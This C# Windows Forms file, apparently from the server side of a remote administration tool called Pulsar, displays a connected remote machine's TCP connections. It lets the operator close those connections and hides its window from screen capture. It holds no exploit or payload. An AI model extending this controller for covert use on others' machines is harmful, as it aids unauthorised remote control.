using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmConnections : Form
    {
        private readonly Client _connectClient;
        private readonly TcpConnectionsHandler _connectionsHandler;
        private readonly Dictionary<string, ListViewGroup> _groups = new();
        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new();
        private readonly HashSet<string> _newKeys = new();
        private readonly Dictionary<ListViewItem, Color> _originalForeColors = new();

        private readonly string _clientAddress;
        private readonly int _clientPort;

        private readonly Timer _refreshTimer;
        private bool _autoRefreshEnabled = true;
        private bool _initialLoad = true;
        private bool _isRefreshing = false;
        private readonly HashSet<string> _initialKeys = new();

        public static FrmConnections CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmConnections f = new(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmConnections(Client client)
        {
            _connectClient = client;
            _connectionsHandler = new TcpConnectionsHandler(client);

            if (client.EndPoint is IPEndPoint endPoint)
            {
                _clientAddress = endPoint.Address.ToString();
                _clientPort = endPoint.Port;
            }
            else
            {
                _clientAddress = string.Empty;
                _clientPort = -1;
            }

            RegisterMessageHandler();
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _refreshTimer = new Timer { Interval = 2000 };
            _refreshTimer.Tick += RefreshTick;
            _refreshTimer.Start();

            autorefreshToolStripMenuItem.Checked = _autoRefreshEnabled;
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _connectionsHandler.ProgressChanged += TcpConnectionsChanged;
            MessageHandler.Register(_connectionsHandler);
        }

        private void UnregisterMessageHandler()
        {
            _refreshTimer?.Stop();
            MessageHandler.Unregister(_connectionsHandler);
            _connectionsHandler.ProgressChanged -= TcpConnectionsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private void RefreshTick(object sender, EventArgs e)
        {
            if (!_autoRefreshEnabled || _isRefreshing)
                return;

            _isRefreshing = true;

            Task.Run(() =>
            {
                try
                {
                    _connectionsHandler.RefreshTcpConnections();
                }
                finally
                {
                    _isRefreshing = false;
                }
            });
        }

        private void TcpConnectionsChanged(object sender, TcpConnection[] connections)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<object, TcpConnection[]>(TcpConnectionsChanged), sender, connections);
                return;
            }

            lock (lstConnections)
            {
                lstConnections.BeginUpdate();
                try
                {
                    UpdateListView(connections);
                }
                finally
                {
                    lstConnections.EndUpdate();
                }
            }
        }

        private void UpdateListView(TcpConnection[] connections)
        {
            var items = lstConnections.Items.Cast<ListViewItem>().ToList();
            var existing = items.ToDictionary(GetKey, x => x);
            var seenNow = new HashSet<string>();

            if (_initialLoad)
            {
                foreach (var con in connections)
                    _initialKeys.Add(GetKey(con));
                _initialLoad = false;
            }

            foreach (var con in connections)
            {
                try
                {
                    string key = GetKey(con);
                    seenNow.Add(key);
                    string state = con.State.ToString();

                    if (!_groups.ContainsKey(state))
                    {
                        var g = new ListViewGroup(state, state);
                        lstConnections.Groups.Add(g);
                        _groups[state] = g;
                    }

                    if (!existing.TryGetValue(key, out var item))
                    {
                        var lvi = CreateListViewItem(con);
                        lvi.Group = _groups[state];
                        lstConnections.Items.Add(lvi);
                    }
                    else
                    {
                        item.SubItems[5].Text = state;
                    }
                }
                catch { }
            }

            // Remove items not present anymore
            foreach (var item in items.Where(i => !seenNow.Contains(GetKey(i))).ToList())
            {
                RemoveListViewItemDelayed(item);
            }

            // Restore scroll position safely
            try
            {
                if (lstConnections.Items.Count > 0 && items.Count > 0)
                    lstConnections.TopItem = lstConnections.Items[Math.Min(items[0].Index, lstConnections.Items.Count - 1)];
            }
            catch { }
        }

        private ListViewItem CreateListViewItem(TcpConnection con)
        {
            var lvi = new ListViewItem(new[]
            {
                con.ProcessName,
                con.LocalAddress,
                con.LocalPort.ToString(),
                con.RemoteAddress,
                con.RemotePort.ToString(),
                con.State.ToString()
            });

            // Highlight client connection
            if (!string.IsNullOrEmpty(_clientAddress) &&
                string.Equals(con.LocalAddress, _clientAddress, StringComparison.OrdinalIgnoreCase) &&
                con.LocalPort == _clientPort)
            {
                lvi.ForeColor = Color.MediumSeaGreen;
                lvi.Font = new Font(lstConnections.Font, FontStyle.Bold);
            }
            else if (!_initialKeys.Contains(GetKey(con)))
            {
                lvi.ForeColor = Color.FromArgb(25, 118, 210);
                _newKeys.Add(GetKey(con));
            }

            _originalForeColors[lvi] = lvi.ForeColor;
            return lvi;
        }

        private void RemoveListViewItemDelayed(ListViewItem item)
        {
            if (item.ForeColor == Color.MediumSeaGreen)
                return;

            item.ForeColor = Color.IndianRed;
            Task.Delay(800).ContinueWith(_ =>
            {
                if (!lstConnections.IsDisposed && lstConnections.Items.Contains(item))
                {
                    lstConnections.Invoke(() => lstConnections.Items.Remove(item));
                }
            });
        }

        private static string GetKey(TcpConnection con) =>
            $"{con.LocalAddress}:{con.LocalPort}-{con.RemoteAddress}:{con.RemotePort}";

        private static string GetKey(ListViewItem item) =>
            $"{item.SubItems[1].Text}:{item.SubItems[2].Text}-{item.SubItems[3].Text}:{item.SubItems[4].Text}";

        private void FrmConnections_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Connections", _connectClient);
            _connectionsHandler.RefreshTcpConnections();
        }

        private void FrmConnections_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectionsHandler.RefreshTcpConnections();
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstConnections.SelectedItems)
            {
                _connectionsHandler.CloseTcpConnection(
                    lvi.SubItems[1].Text,
                    ushort.Parse(lvi.SubItems[2].Text),
                    lvi.SubItems[3].Text,
                    ushort.Parse(lvi.SubItems[4].Text));
            }
            _connectionsHandler.RefreshTcpConnections();
        }

        private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            lstConnections.LvwColumnSorter.NeedNumberCompare = (e.Column == 2 || e.Column == 4);
        }

        private void autorefreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _autoRefreshEnabled = !_autoRefreshEnabled;
            autorefreshToolStripMenuItem.Checked = _autoRefreshEnabled;

            if (_autoRefreshEnabled)
            {
                _refreshTimer.Start();
                _connectionsHandler.RefreshTcpConnections();
                this.Text = WindowHelper.GetWindowTitle("Connections (Auto Refresh On)", _connectClient);
            }
            else
            {
                _refreshTimer.Stop();
                this.Text = WindowHelper.GetWindowTitle("Connections (Auto Refresh Off)", _connectClient);
            }
        }

        private void SearchListView(string keyword)
        {
            keyword = keyword?.Trim().ToLower() ?? "";
            bool isDarkTheme = lstConnections.BackColor.R < 128;

            foreach (ListViewItem item in lstConnections.Items)
            {
                string key = GetKey(item);
                bool match = item.SubItems.Cast<ListViewItem.ListViewSubItem>()
                                .Any(sub => sub.Text.ToLower().Contains(keyword));

                if (string.IsNullOrEmpty(keyword))
                {
                    item.BackColor = Color.Empty;
                    item.ForeColor = _newKeys.Contains(key) ? Color.FromArgb(25, 118, 210) :
                                      (isDarkTheme ? Color.White : Color.Black);
                }
                else if (match)
                {
                    item.BackColor = isDarkTheme ? Color.FromArgb(80, 80, 50) : Color.LightGoldenrodYellow;
                    item.ForeColor = isDarkTheme ? Color.White : Color.Black;
                }
                else
                {
                    item.BackColor = Color.Empty;
                    item.ForeColor = _newKeys.Contains(key) ? Color.FromArgb(25, 118, 210) :
                                      (isDarkTheme ? Color.White : Color.Black);
                }
            }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Control | Keys.F))
            {
                searchToolStripMenuItem_Click(this, EventArgs.Empty);
                return true;
            }

            if (keyData == Keys.Delete)
            {
                if (lstConnections.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem lvi in lstConnections.SelectedItems)
                    {
                        try
                        {
                            _connectionsHandler.CloseTcpConnection(
                                lvi.SubItems[1].Text,
                                ushort.Parse(lvi.SubItems[2].Text),
                                lvi.SubItems[3].Text,
                                ushort.Parse(lvi.SubItems[4].Text));
                        }
                        catch { }
                    }
                    _connectionsHandler.RefreshTcpConnections();
                }
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);

            try
            {
                if (lstConnections.Items.Count > 0)
                {
                    lstConnections.BeginUpdate();

                    // Always snap the first visible group to the top
                    var topGroup = lstConnections.TopItem?.Group ?? lstConnections.Groups.Cast<ListViewGroup>().FirstOrDefault();
                    if (topGroup != null)
                    {
                        // Scroll to the first item of that group
                        var firstItemInGroup = lstConnections.Items.Cast<ListViewItem>()
                                                    .FirstOrDefault(i => i.Group == topGroup);
                        if (firstItemInGroup != null)
                            lstConnections.TopItem = firstItemInGroup;
                    }

                    lstConnections.EndUpdate();
                }
            }
            catch { }
        }

        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string keyword = Microsoft.VisualBasic.Interaction.InputBox(
                "Enter search keyword:",
                "Search Connections",
                "");

            SearchListView(keyword);
        }
    }
}
